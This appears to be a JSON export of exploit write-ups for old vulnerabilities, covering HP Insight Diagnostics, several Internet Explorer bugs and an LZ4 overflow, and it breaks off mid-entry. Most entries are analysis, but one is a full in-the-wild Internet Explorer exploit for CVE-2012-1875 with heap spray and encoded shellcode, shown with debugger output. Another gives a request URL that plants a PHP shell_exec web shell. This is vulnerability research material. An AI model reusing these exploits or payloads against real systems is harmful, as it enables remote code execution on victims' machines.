      "document": "\n# Environment:\n\nTested on both windows and linux (x32) platforms.\n\nThe installation requires HP Insight Diagnostics Online Edition & HP System\nManagement Homepage for Windows or Linux\n\nUsed HP System Management Homepage 7.2.0.14 and several versions of HP Insight\nDiagnostics Online Edition from 9.1.0.4458 until 9.4.0-562. (Also tested from\nbranch 8).\n\n# VMWare\n\nUnfortunately is not possible to execute HP Insight Diagnostics by default,\nbecause it isn't a supported manufacturer. The insight solution uses the\nencrypted supportesystems.dat in order to have a list os fupported\nmanufacturers. A Decryptor class in Ruby has been programmed in order to decrypt\nthe orignal supportesystems.dat, after it a custom Manufacturer (VMWare) can be\nadded in order to execute HP Insight under VMware, then the file should be\nencrypted again (The Decryptor class also allow to encrypt)\n\n# Access to the vulnerable components:\n\nAccess to the HP System Management Homepage should be granted in order to use\nthe vulnerable webapp installed with HP Insight. Anonymous access can be\nconfigured for HP System Management Homepage, which would make this vuln\nspecially interesting.\n\n# Vulnerable components:\n\nBoth components hpdiags/frontend2/commands/saveCompareConfig.php and\nhpdiags/frontend2/help/pageview.php are available after installation.\n\n# Vulnerabilities analysis:\n\nCVE-2013-3575 has been found in code as expected, allowing for a restricted PHP\nlocal file inclusion:\n\n```\nif (strpos($_GET['path'], '..') !== false ||\n    strpos($_GET['path'], '.htm') === false)\n  exit('Invalid Path');\n// append path to the help directory to ensure we are in the right spot\n$path = realpath(dirname(__FILE__) . '/' . $_GET['path']);\n```\n\nLater:\n\n```\nif (!isset($_GET['word']))\n{\n  include_once $path;\n}\n```\n\nBut CVE-2013-3574 has not been found. Indeed the exploit vector published at the\noriginal advisory:\n\n```\nhttps://<host>:2381/hpdiags/frontend2/commands/saveCompareConfig.php?filename=comparesurvey&target=winhardrive&device=&devicePath=C:/hp/hpsmh/data/htdocs/hpdiags/frontend2/help/&category=all&advanced=yes&leftFile=surveybase.xml&leftFileName=<%3f=shell_exec($_REQUEST[0])%3b%3f>&rightFile=survey.lastwebsession.xml&rightFileName=-&changesOnly=yes&overwrite=yes\n```\n\nIs only available through a (*guessing* old) and unused (commented) FileSaver\nclass (hpdiags/frontend2/includes/filesaver.class.php):\n\n```\n/* <== Commented!\nclass FileSaver\n{\n  function doesFileExist($filename, $extension, $target, $mount, $device)\n  {\n    if ($target == 'winfloppy')\n      $mount = 'a:/';\n    else if ($mount{strlen($mount)-1} != '/')\n      $mount .= '/';\n    $filename .= ('.' . $extension);\n    $filepath = ($mount . $filename);\n    if ($target != 'winfloppy' &&\n        $target != 'winhardrive' &&\n        $target != 'hardrive')\n    {\n      $unmountDirectory = true;\n(cut)\n```\n\nBut by using the new FileSaver class the exploit vector commented above isn't available anymore. Even when still is possible save an array to a file:\n\n```\n  function saveArrayToFile($filename, $extension, $devicePath, $array)\n  {\n    $filename = sprintf(\"%s.%s\", $filename, $extension);\n    $tempFileName = sprintf(\"%s.temp_%s\", $filename, $extension, date(\"YmdHis\"));\n    $tempFilePath = FileSaver::saveArrayToTempDirectory($tempFileName, $array);\n    $stdout = AIBridge::copyFileToSaveDevice($tempFilePath, $devicePath, $filename);\n\n    $xml = new XMLDocument($stdout);\n    if ($xml)\n    {\n      $document = $xml->document_element();\n      if ($document->tagname() == 'error')\n      {\n        FileSaver::log($document->get_content());\n        @ unlink($tempFilePath);\n        return false;\n      }\n      else if ($document->tagname() != \"success\")\n      {\n        FileSaver::log($stdout);\n        @ unlink($tempFilePath);\n        return false;\n      }\n    }\n    else\n    {\n      FileSaver::log(\"Invalid XML: $stdout\");\n      @ unlink($tempFilePath);\n      return false;\n    }\n    @ unlink($tempFilePath);\n    return true;\n  }\n```\n\n\n ButinthisimplementationtheAIBridgeclassisusedtocopythefiletoasavedevice:\n\n```\n$stdout = AIBridge::copyFileToSaveDevice($tempFilePath, $devicePath, $filename);\n```\n\nThe AIBridge class is a way of passing commands to the hpdiagsai.exe (or\nhpdiagsai) binary.\n\nIn order to make a copyFileToSaveDevice a copyFileToRemovableMediaDevice command\nis issued. Unfortunately, the command isn't available on windows:\n\n```\n[!] Command\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<copyFileToRemovableMediaDevice srcPath=\"C:/hp/hpsmh/session/php/comparesurvey.html.temp_html\" devicePath=\"C:/hp/hpsmh/data/htdocs/hpdiags/frontend2/help/\" filename=\"comparesurvey.html\"/>\n```\n\n[!] Response\n\n```\n<error>../../src/common/diagprocessmain.cpp(line 523), Invalid command</error>\n```\n\nAnd in linux a removable device should be provided:\n\n2013-01-24 00:47:20\naicommand: IN:\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<copyFileToRemovableMediaDevice srcPath=\"/opt/hp/hpsmh/session/php/comparesurvey.html.temp_html\" devicePath=\"/opt/hp/hpsmh/data/htdocs/hpdiags/frontend2/help/\" filename=\"comparesurvey.html\"/>\n\n2013-01-24 00:47:20\naicommand: OUD:\n<error>mount failed: source is not a block device (and a device was required).</error>\n```\n\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "3fd70e1c-b063-4582-b9ec-ca71b3ee01ce",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "38b15624-980b-45e2-bde4-ee54bfba9846",
      "created": "2019-09-12T18:07:41.433906Z",
      "revisionDate": "2020-02-13T17:12:12.369612Z",
      "document": "\n\nExploit Hash: 203aa9b2439cfab4ff1678a227be9a9a\n\n# Information\n\nCVE-2013-3893 is a use-after-free vulnerability that affects Internet Explorer versions 6/7/8/9/10/11.\nIt was initially found being exploited in Japan. A fix-it workaround is already available at the time\nof the writing, no information on when Microsoft will release an official final to address the IE flaw.\n\nA sample of the exploit (in the wild) can be found on VirusTotal, scrumware.org, and jsunpack.\n\nThe exploit in the wild is written to target IE8/9, Win XP and Windows 7. Under Win XP, the code is\nspecifically tweaked to work against languages including English, Chinese, Japanese, Korean, although\nits fingerprinting code actually checks these languages: English, Chinese, French, German, Japanese,\nPortuguese, Korean, and Russian.  It is safe to say it's designed to work against Windows machines in\nAsia, hard to why other languages are fingerprinted but not tweaked.  Either because the author was\nlazy to test them, and the fingerprinting code was a lazy copy-and paste.  Or, they can be exploited\nsuccessfully without any tweaks. Under Windows 7, Office 2007 is also required to engauge the target,\nhowever the fingerprinting code also checks Office 2010, which seems rather unnecessary.  The exploit\nwill attempt again and again until either the browser crashes, or indefinitely. After exploitation,\nthe exploit will set a cookie on the victim machine as a way to avoid hitting the same target again.\n\nThe vulnerability is due to how the mshtml!CDoc::SetMouseCapture function handles a reference during\nan event. An attacker first can setup two elements, where the second is the child of the first, and\nthen setup a onlosecapture event handler for the parent element. The onlosecapture event seems to\nrequire two setCapture() calls to trigger, one for the parent element, one for the child. When the\nsetCapture() call for the child element is called, it finally triggers the event, which allows the\nattacker to cause an arbitrary memory release using document.write(), which in particular frees up\na 0x54-byte memory.  The exact size of this memory may differ based on the version of IE. After the\nfree, an invalid reference will still be kept and pass on to more functions, eventuall this arrives\nin function MSHTML!CTreeNode::GetInterface, and causes a crash (or arbitrary code execution) when\nthis function attempts to use this reference to call what appears to be a PrivateQueryInterface due\nto the offset (0x00).\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "e02947f2-605f-4a9f-9fcc-b581c8b7f9da",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "86f6b513-5cd4-4249-98fd-f14e9b841b85",
      "created": "2019-09-12T18:07:42.189232Z",
      "revisionDate": "2020-02-13T17:12:12.123856Z",
      "document": "\n\nA memory corruption flaw exists in Microsoft Internet Explorer. The program fails to sanitize\nuser-supplied input when handling the Same ID property, resulting in memory corruption. With a\nspecially crafted web page which accesses a deleted object, a context-dependent attacker can\nexecute arbitrary code.\n\n# Discovered by\n\n* Qof VulnHunt for reporting the Same ID Property Remote Code Execution Vulnerability (CVE-2012-1875)\n* Qihoo 360 Security Center for working with us on the Same ID Property Remote Code Execution Vulnerability (CVE-2012-1875)\n* Yichong Lin of McAfee Labs for working with us on the Same ID Property Remote Code Execution Vulnerability (CVE-2012-1875)\n* Google Inc. for working with us on the Same ID Property Remote Code Execution Vulnerability (CVE-2012-1875)\n\n# PoC\n\nhttp://pastebin.com/raw.php?i=sFqxs4qx\n\n```html\n<HTML>\n\n    <BODY>\n        <title></title>\n        <DIV id=testfaild>\n            <img id=\"imgTest\" style=\"display:none\">\n            <a href=\"javascript:OnTest();\" id=\"MyA\" onClick=\"OnTest();\"><div style=\"background-color:#FFFFFF; width:30; height:40\" id=\"imgTest\" src=\"\" onMouseOver=\"OnTest2();\" onMouseOut=\"OnTest2();\"></div></a>\n        </DIV>\n        <SCRIPT LANGUAGE=\"JavaScript\">\n            function S(dword) {\n                var t = unescape;\n                var d = Number(dword).toString(16);\n                while (d.length < 8) d = '0' + d;\n                return t('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));\n            }\n            function OnTest() {\n                var tag = 0x1c1c1c0c;\n                var vtable1 = S(tag) + '1234567555555555588888888';\n                var divs = new Array();\n                for (var i = 0; i < 128; i++) divs.push(document.createElement('div'));\n                testfaild.innerHTML = testfaild.innerHTML;\n                divs[0].className = vtable1;\n                divs[1].className = vtable1;\n                divs[2].className = vtable1;\n                divs[3].className = vtable1;\n            }\n            function OnTest2() {\n                eval(\"imgTest\").src = \"\";\n            }\n            function setcookie() {\n                var Then = new Date() Then.setTime(Then.getTime() + 1000 * 3600 * 24 * 3) document.cookie = \"Cookie1=hellofckworld;expires=\" + Then.toGMTString()\n            }\n            function readcookie() {\n                var cookieString = new String(document.cookie);\n                if (cookieString.indexOf(\"hellofckworld\") == -1) {\n                    return 0\n                } else {\n                    return 1;\n                }\n            }\n            function trigger() {\n                var x = document.getElementsByTagName(\"div\");\n                var fireOnThis = document.getElementById(\"MyA\");\n                if (document.createEvent) {\n                    evObj = document.createEvent('MouseEvents');\n                    evObj.iniEvent('click', true, false);\n                    fireOnThis.dispatchEvent(evObj);\n                } else if (document.createEventObject) {\n                    x[1].fireEvent('onMouseOver');\n                    fireOnThis.fireEvent('onclick');\n                    x[1].fireEvent('onMouseOut');\n                }\n            }\n            function main() {\n                if (readcookie()) return;\n                ConVertData = window[\"\\x75\\x6e\\x65\\x73\\x63\\x61\\x70\\x65\"];\n                var vbc = (\"NewYoukv10ebNewYoukv4b5bNewYoukvc933NewYoukvb966NewYoukv01d9NewYoukv3480NewYoukv990bNewYoukvfae2NewYoukv05ebNewYoukvebe8NewYoukvffffNewYoukvcfffNewYoukvcbceNewYoukv50aaNewYoukv12fdNewYoukva9e8NewYoukvef12NewYoukv1295NewYoukv85efNewYoukvc712NewYoukv1291NewYoukvb9e7NewYoukvaf12NewYoukve618NewYoukvaa95NewYoukvab99NewYoukvec99NewYoukvc376NewYoukvc7c6NewYoukvf370NewYoukv9998NewYoukvc099NewYoukv3010NewYoukv9b99NewYoukv9999NewYoukv2010NewYoukv9b9dNewYoukv9999NewYoukv2810NewYoukv9b91NewYoukv9999NewYoukv7012NewYoukv6412NewYoukv9cf3NewYoukv71c0NewYoukv989dNewYoukv9999NewYoukv607bNewYoukvcc12NewYoukv1a99NewYoukv9c5bNewYoukvb872NewYoukv14c2NewYoukv62d4NewYoukvf6f1NewYoukv99f7NewYoukvf199NewYoukvebecNewYoukvf4f5NewYoukvc8cdNewYoukv6612NewYoukv12ccNewYoukv5f75NewYoukvf198NewYoukvc010NewYoukv5f98NewYoukv9cd8NewYoukv665aNewYoukv717bNewYoukv6643NewYoukv6666NewYoukv4112NewYoukv98f3NewYoukv71c0NewYoukv9953NewYoukv9999NewYoukv607bNewYoukv1c14NewYoukv9898NewYoukv9999NewYoukvf1c9NewYoukv9899NewYoukv9999NewYoukvcc66NewYoukv109dNewYoukv651cNewYoukv9999NewYoukv5e99NewYoukv9c1dNewYoukv9898NewYoukv9999NewYoukve9ecNewYoukvf8fdNewYoukv1d5eNewYoukv9c9cNewYoukv9998NewYoukved99NewYoukvb7fcNewYoukv5efcNewYoukv9c1dNewYoukv9890NewYoukv9999NewYoukvfce1NewYoukv9999NewYoukvcc12NewYoukv1a8dNewYoukv9c5bNewYoukvbf72NewYoukv14c2NewYoukv62d4NewYoukv6faaNewYoukvcfcfNewYoukv1c14NewYoukv9898NewYoukv9999NewYoukv14c9NewYoukv81dcNewYoukvcfc9NewYoukv12c8NewYoukvcc66NewYoukv7512NewYoukv985fNewYoukv10f1NewYoukv98c0NewYoukvd85fNewYoukv5a9cNewYoukv7b66NewYoukv4c71NewYoukv6666NewYoukv1266NewYoukv91ccNewYoukv5b1aNewYoukv729cNewYoukvc2aaNewYoukvd414NewYoukvcf62NewYoukv1c12NewYoukv9965NewYoukv9999NewYoukv1c5fNewYoukv9899NewYoukv9999NewYoukv5fbbNewYoukv9c1dNewYoukv9892NewYoukv9999NewYoukv14bbNewYoukv991cNewYoukv9998NewYoukvc999NewYoukv12c8NewYoukvcc66NewYoukv7512NewYoukv985fNewYoukv10f1NewYoukv98c0NewYoukvd85fNewYoukv5a9cNewYoukv7b66NewYoukv5171NewYoukv6666NewYoukv1266NewYoukv9934NewYoukv999bNewYoukv1299NewYoukv9d24NewYoukv999bNewYoukv1299NewYoukv912cNewYoukv999bNewYoukv1299NewYoukv1a7cNewYoukv8975NewYoukv9921NewYoukv6796NewYoukvaae6NewYoukv5a42NewYoukvccc8NewYoukvea12NewYoukv12a5NewYoukv87edNewYoukv9ae1NewYoukvcf6aNewYoukvef12NewYoukv9ab9NewYoukvaa6aNewYoukvd050NewYoukv34d8NewYoukv5a9aNewYoukv74aaNewYoukv2796NewYoukva389NewYoukved4fNewYoukv5891NewYoukv9e54NewYoukv739aNewYoukv72d9NewYoukva268NewYoukvecb6NewYoukvc77eNewYoukvf712NewYoukv9abdNewYoukvff72NewYoukvd512NewYoukv99d4NewYoukvf712NewYoukv9a85NewYoukv1272NewYoukv14ddNewYoukv9a99NewYoukv325aNewYoukvc0c4NewYoukv715aNewYoukv6708NewYoukv6666NewYoukvedabNewYoukv9508NewYoukv7ba0NewYoukv1ae4NewYoukvb6c8NewYoukv983bNewYoukvfc39NewYoukv520eNewYoukv10faNewYoukvd648NewYoukv4f19NewYoukv0336NewYoukvedf1NewYoukve9edNewYoukvb6a3NewYoukveeb6NewYoukveeeeNewYoukvefb7NewYoukvf5f0NewYoukvf8f5NewYoukvfefeNewYoukvf4f0NewYoukvf7f8NewYoukvf8f0NewYoukvf0b7NewYoukvb6edNewYoukvf4f0NewYoukvb6feNewYoukvf6fbNewYoukvf2f6NewYoukvb7eaNewYoukvf8faNewYoukv99fb\");\n                var xbc = ConVertData(vbc.replace(/NewYoukv/g, \"%u\"));\n                var a = new Array();\n                var ls = 0x100000 - (xbc.length * 2 + 0x01020);\n                var bc = S(0x1c1c1c0c);\n                var pad = S(0x1c1c1c0c);\n                while (pad.length < 0x3000) pad += pad;\n                bc = pad.substring(0, (0x1c0c - 0x24) / 2);\n                var language;\n                if (navigator.appName == 'Netscape') language = navigator.language;\n                else language = navigator.browserLanguage;\n                var myStr = (\"NewYoukvef5bNewYoukv77c1NewYoukvf519NewYoukv77c1NewYoukv1118NewYoukv77c1NewYoukv3e25NewYoukv77c2NewYoukv746aNewYoukv77c3NewYoukv1c8cNewYoukv1c1cNewYoukv1c8cNewYoukv1c1cNewYoukv1000NewYoukv0000NewYoukv0040NewYoukv0000NewYoukv1c4cNewYoukv1c1cNewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv5ed5NewYoukv77c1NewYoukv9090NewYoukv9090NewYoukv9090NewYoukv9090NewYoukv9090NewYoukv9090\");\n                myStr = ConVertData(myStr.replace(/NewYoukv/g, \"%u\"));\n                bc += myStr;\n                bc += xbc;\n                bc += S(0) + S(0);\n                var b = S(0x1c1c1c0c);\n                while (b.length < 0x10000) {\n                    b += b;\n                }\n                bc = bc + b;\n                b = bc.substring(0, 0x10000 / 2);\n                while (b.length < ls) {\n                    b += b;\n                }\n                var lh = b.substring(0, ls / 2);\n                delete b;\n                delete pad;\n                lh = lh + xbc;\n                for (var i = 0; i < 0x1c0; i++) a[i] = lh.substr(0, lh.length);\n                setTimeout(\"trigger();\", 1000);\n                setcookie();\n            }\n            main();\n        </SCRIPT>\n    </BODY>\n\n</HTML>\n```\n\n\n# Details\n\n\nCrash\n\n```\n(a9c.998): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** ERROR: Symbol file could not be found.  Defaulted to export\nsymbols for C:\\WINDOWS\\system32\\mshtml.dll -\neax=1c1c1c0c ebx=00000000 ecx=02fdf588 edx=00000001 esi=02fdf588 edi=020bbaf0\neip=6363fcc6 esp=020bba88 ebp=020bba94 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!DllGetClassObject+0xafd09:\n6363fcc6 8b5070          mov     edx,dword ptr [eax+70h]\nds:0023:1c1c1c7c=????????\n```\n\nSPRAY HOW TO\n\n```\n0:008> db 1c1c1024 L1000\n1c1c1024  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................\n.\n.\n.\n2023\n```\n\nDigging into the crash\n\n```\n0:008> kb\nChildEBP RetAddr  Args to Child\n020bba84 63660eed 80020003 00176778 020bbaa4 mshtml!CElement::Doc+0x2\n020bba94 63660f5a 00000000 00000348 020bbaf8 mshtml!CElement::GetAtomTable+0x10\n020bbaa4 635b6bb7 033b49ac 00000003 00176701 mshtml!CCollectionCache::GetAtomFromName+0x15\n020bbaf8 635e7b76 0023f4d8 033b49ac 00000003 mshtml!CCollectionCache::GetIntoAry+0x74\n020bbb3c 635e7c20 0000000e 033b49ac 020bbc28 mshtml!CCollectionCache::GetDispID+0x13e\n020bbb50 635d36b0 0023f4d8 0000000e 033b49ac mshtml!DispatchGetDispIDCollection+0x3f\n020bbb78 63643d3e 03137230 033b49ac 10000003 mshtml!CElementCollectionBase::VersionedGetDispID+0x46\n020bbbb8 633a9eb2 03137260 033b49ac 10000003 mshtml!PlainGetDispID+0xdc\n020bbbe8 633a9e13 033b49ac 020bbc28 03137260 jscript!IDispatchExGetDispID+0xb7\n020bbc04 633a9f17 008da788 020bbc28 00000003 jscript!GetDex2DispID+0x34\n020bbc30 633a77ff 008da788 020bbc64 0000000c jscript!VAR::InvokeByName+0xeb\n020bbc78 633a75bf 008da788 0000000c 00000000 jscript!VAR::InvokeDispName+0x7a\n020bbe0c 633a5ab0 020bbe24 020bbf6c 020bbf6c jscript!CScriptRuntime::Run+0x1f27\n020bbef4 633a59f7 020bbf6c 00000000 008de830 jscript!ScrFncObj::CallWithFrameOnStack+0xff\n020bbf40 633a5743 020bbf6c 00000000 008de830 jscript!ScrFncObj::Call+0x8f\n020bbfbc 633a8bc7 008dc830 020be3b8 00000000 jscript!CSession::Execute+0x175\n020bc0a4 633a8a35 008dc830 00000000 00000001 jscript!NameTbl::InvokeDef+0x1b8\n020bc128 633a6d37 008dc830 00000000 00000001 jscript!NameTbl::InvokeEx+0x129\n020bc168 633a6c75 008da788 00000000 00000001 jscript!IDispatchExInvokeEx2+0xf8\n020bc1a4 63399186 008da788 00000001 00000001 jscript!IDispatchExInvokeEx+0x6a\n020bc234 635fe083 020bc1f8 00000004 00000001 jscript!NameTbl::InvokeEx+0x372\n020bc26c 635fdfab 02dc8a18 00000001 00000001 mshtml!CScriptCollection::InvokeEx+0x8a\n020be2e0 63642f30 02d1e060 00002712 00000001 mshtml!CWindow::InvokeEx+0x6a9\n020be308 63642eec 02d1e060 00002712 00000001 mshtml!CBase::VersionedInvokeEx+0x20\n020be358 63643898 031371a0 00002712 00000001 mshtml!PlainInvokeEx+0xea\n020be3c8 636435c4 02d17200 00002712 00000001 mshtml!COmWindowProxy::InvokeEx+0x338\n020be3f0 63642f30 02d17200 00002712 00000001 mshtml!COmWindowProxy::subInvokeEx+0x26\n020be418 63642eec 02d17200 00002712 00000001 mshtml!CBase::VersionedInvokeEx+0x20\n020be468 633a6d37 0020d2e0 00002712 00000001 mshtml!PlainInvokeEx+0xea\n020be4a8 633a6c75 008da788 00002712 00000409 jscript!IDispatchExInvokeEx2+0xf8\n020be4e4 633a9cfe 008da788 00000409 00000001 jscript!IDispatchExInvokeEx+0x6a\n020be5a4 633a9d79 00002712 00000001 00000000 jscript!InvokeDispatchEx+0x98\n020be5d0 633a9c0b 008da788 00000000 00000001 jscript!VAR::InvokeByDispID+0x154\n020be76c 633a5ab0 020be784 020be8cc 020be8cc jscript!CScriptRuntime::Run+0x2989\n020be854 633a59f7 020be8cc 00000000 008de8d0 jscript!ScrFncObj::CallWithFrameOnStack+0xff\n020be8a0 633a5743 020be8cc 00000000 008de8d0 jscript!ScrFncObj::Call+0x8f\n020be91c 633a8bc7 033a6348 020beb60 00000000 jscript!CSession::Execute+0x175\n020bea04 633a8a35 033a6348 00000000 00000001 jscript!NameTbl::InvokeDef+0x1b8\n020bea88 635c3039 033a6348 00000000 00000409 jscript!NameTbl::InvokeEx+0x129\n020bead8 635c2f51 03182d38 033a6348 00000000 mshtml!CBase::InvokeDispatchWithThis+0x1e0\n020bec04 636294ce 80010009 80011771 03137710 mshtml!CBase::InvokeEvent+0x213\n020bed64 635f377c 03182d38 02d03060 03182d38 mshtml!CBase::FireEvent+0xe2\n020beddc 6362b142 03182d38 02dc8f40 ffffffff mshtml!CElement::BubbleEventHelper+0x2e3\n020bef40 63783dd6 63649344 00000000 02dc8f40 mshtml!CElement::FireEvent+0x2d1\n020bf080 638e6827 03182d38 033b4b88 020bf0b8 mshtml!CElement::fireEvent+0x185\n020bf0c8 636430c9 03182d38 008d8f80 031371d0 mshtml!Method_VARIANTBOOLp_BSTR_o0oVARIANTp+0xfb\n020bf13c 6366418a 03182d38 80010452 00000001 mshtml!CBase::ContextInvokeEx+0x5d1\n020bf18c 6362b6ce 03182d38 80010452 00000001 mshtml!CElement::ContextInvokeEx+0x9d\n020bf1b8 63642eec 03182d38 80010452 00000001 mshtml!CElement::VersionedInvokeEx+0x2d\n020bf208 633a6d37 03137620 80010452 00000001 mshtml!PlainInvokeEx+0xea\n020bf248 633a6c75 008da788 80010452 00000409 jscript!IDispatchExInvokeEx2+0xf8\n020bf284 633a9cfe 008da788 00000409 00000001 jscript!IDispatchExInvokeEx+0x6a\n020bf344 633a9f3c 80010452 00000001 00000000 jscript!InvokeDispatchEx+0x98\n020bf378 633a77ff 008da788 020bf3ac 00000001 jscript!VAR::InvokeByName+0x135\n020bf3c4 633a85c7 008da788 00000001 00000000 jscript!VAR::InvokeDispName+0x7a\n020bf3f4 633a9c0b 008da788 00000000 00000001 jscript!VAR::InvokeByDispID+0xce\n020bf590 633a5ab0 020bf5a8 00000000 00000000 jscript!CScriptRuntime::Run+0x2989\n020bf678 633a59f7 00000000 00000000 008de980 jscript!ScrFncObj::CallWithFrameOnStack+0xff\n020bf6c4 633a92f7 00000000 00000000 008de980 jscript!ScrFncObj::Call+0x8f\n020bf748 633a6650 008defa8 008da788 00000001 jscript!NameTbl::InvokeInternal+0x137\n020bf778 633a9c0b 008da788 00000000 00000001 jscript!VAR::InvokeByDispID+0x17c\n020bf914 633a5ab0 020bf92c 020bfa74 020bfa74 jscript!CScriptRuntime::Run+0x2989\n020bf9fc 633a59f7 020bfa74 00000000 00000000 jscript!ScrFncObj::CallWithFrameOnStack+0xff\n020bfa48 633a5743 020bfa74 00000000 00000000 jscript!ScrFncObj::Call+0x8f\n020bfac4 633a8bc7 008dedc0 020bfcd4 00000000 jscript!CSession::Execute+0x175\n020bfbac 633a8a35 008dedc0 00000000 00000001 jscript!NameTbl::InvokeDef+0x1b8\n020bfc30 633a9153 008dedc0 00000000 00000000 jscript!NameTbl::InvokeEx+0x129\n020bfc58 636867fa 008dedc0 00000000 63633600 jscript!NameTbl::Invoke+0x70\n020bfcec 6368675a 02d1e060 02decc60 00239040 mshtml!CWindow::ExecuteTimeoutScript+0x87\n020bfd44 6368664a 02d1e060 02d1e0a2 020bfd78 mshtml!CWindow::FireTimeOut+0xb6\n020bfd54 63686656 0000202b 020bfde0 6363c317 mshtml!CStackPtrAry<unsigned long,12>::GetStackSize+0xb6\n020bfd78 7e418734 001005d8 00000011 0000202b mshtml!GlobalWndProc+0x183\n020bfda4 7e418816 6363c317 001005d8 00000113 USER32!InternalCallWinProc+0x28\n020bfe0c 7e4189cd 00000000 6363c317 001005d8 USER32!UserCallWinProcCheckWow+0x150\n020bfe6c 7e418a10 020bfe94 00000000 020bfeec USER32!DispatchMessageWorker+0x306\n020bfe7c 01252ec9 020bfe94 00000000 008d5d00 USER32!DispatchMessageW+0xf\n020bfeec 011f48bf 001703f8 00000001 00150390 IEFRAME!CTabWindow::_TabWindowThreadProc+0x461\n020bffa4 5de05a60 008d5d00 0fbc002f 020bffec IEFRAME!LCIETab_ThreadProc+0x2c1\n020bffb4 7c80b713 00150390 00000001 0fbc002f iertutil!CIsoScope::RegisterThread+0xab\n020bffec 00000000 5de05a52 00150390 00000000 kernel32!BaseThreadStart+0x37\n```\n\nCrashing here in IE8 XP SP3\n\n```\n.text:6363FCC4 ; public: class CDoc * __thiscall CElement::Doc(void)const\n.text:6363FCC4                 mov     eax, [ecx]\n.text:6363FCC6                 mov     edx, [eax+70h]\n.text:6363FCC9                 call    edx\n.text:6363FCCB                 mov     eax, [eax+0Ch]\n.text:6363FCCE                 retn\n```\n\n\n# References\n\nhttp://www.osvdb.org/show/osvdb/82865\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "e76aacc7-245b-42ad-9194-6f55c57c1332",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "42d17cb0-fa17-452e-a83b-20f2c3c10da3",
      "created": "2019-09-12T18:07:42.869118Z",
      "revisionDate": "2020-02-13T17:12:11.849765Z",
      "document": "\n\nVulnerability:\n\nthe WebPartHelper Class offers the OpenInEditor() method, see typelib:\n\n...\n  /* DISPID=8 */\nfunction OpenInEditor(\n        /* VT_VARIANT [12] [in] */ $URL\n        )\n{\n}\n...\n\nBy passing an null session share path to the URL argument of this method\nis possible to launch an arbitrary executable.\n\nThis is because of a ShellExecuteExW() call inside RFMSsvs.dll\n\n\nAnalysis:\n\nThe ShellExecuteW is this one:\n\n.text:100E9F07 loc_100E9F07:                           ; CODE XREF: JShellExecuteEx+1B6j\n.text:100E9F07                 push    esi             ; pExecInfo\n.text:100E9F08                 call    ds:ShellExecuteExW\n\nWhere the pExecInfo can be partially controlled by the user:\n\n.text:100E9EDE                 call    ds:??BGUserText@@QBEPB_WXZ ; GUserText::operator wchar_t const *(void)\n.text:100E9EE4                 mov     [esi+10h], eax\n\nBut just the esi+10h field of a SHELLEXECUTEINFO can be controlled:\n\ntypedef struct _SHELLEXECUTEINFO {\n  DWORD     cbSize;\n  ULONG     fMask;\n  HWND      hwnd;\n  LPCTSTR   lpVerb;\n  LPCTSTR   lpFile; <== esi + 10h\n  LPCTSTR   lpParameters;\n  LPCTSTR   lpDirectory;\n  int       nShow;\n  HINSTANCE hInstApp;\n  LPVOID    lpIDList;\n  LPCTSTR   lpClass;\n  HKEY      hkeyClass;\n  DWORD     dwHotKey;\n  union {\n    HANDLE hIcon;\n    HANDLE hMonitor;\n  } DUMMYUNIONNAME;\n  HANDLE    hProcess;\n} SHELLEXECUTEINFO, *LPSHELLEXECUTEINFO;\n\nSo just the lpFile can be controlled. It doesn't allow to an awesome exploitation, but there are cases on metasploit.\n\nJust use a WebDav to simulate a SMB resource, the target machine should have enabled the WebClient service (WebDAV Mini-Redirector). And\nexecute a file via an UNC path. Anyway exploitation limited to machines with WebClient enabled (Windows XPSP3 enabled by default).\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "28484fad-bd7f-4673-9c2c-264c2218ad7e",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "ab7462e1-84b6-45b0-8d93-6857fb1ce045",
      "created": "2019-09-12T18:07:43.476949Z",
      "revisionDate": "2020-10-19T23:10:35.852092Z",
      "document": "\n\nOn Jun 26th, Don A. Bailey of Security Mouse published a blog detailing an integer overflow within\nthe LZO algorithm, specifically the LZ4 variant. The writeup can be found here:\n\nhttp://blog.securitymouse.com/2014/06/raising-lazarus-20-year-old-bug-that.html\n\nPoC Example (Windows 32-bit):\n\n```\n#include \"lz4.h\"\n\nchar output[20<<20];\nchar input[20<<20];\nint main(int argc, char* argv[]) {\n  input[0] = 0x0F;\n  input[1] = 0x00;\n  input[2] = 0x00;\n  for(int i = 3; i < 16800000; i++)\n    input[i] = 0xff;\n  LZ4_uncompress(input, output, 20<<20);\n  return 0;\n}\n```\n\nThe LZ4 algorithm is vulnerable but in the real world no implementations are because either the\nnecessary vulnerable conditions aren't dialed in correctly, or there is something else in place\n(in the software or by operating system) that prevents the bug from exploitation. The flaw\nrequires the following conditions:\n\n* Must be in a 32-bit environment, which means all servers are safe from this issue.\n* The attacker need to forge a special compressed block to overflow a 32-bit address space and\n  cause the decoding process to overflow, but it can only be done if the compressed block is\n  something like 16MB or more. Some real-world implementations:\n  \t* Legacy LZ4 file format is limited to 8MB, newer format is at 4MB.\n  \t* ZFS = 128KB\n  \t* zram = 